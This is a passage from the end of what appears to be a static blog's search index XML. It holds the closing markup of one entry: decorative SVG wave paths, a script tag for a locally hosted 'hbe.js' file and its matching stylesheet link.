viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
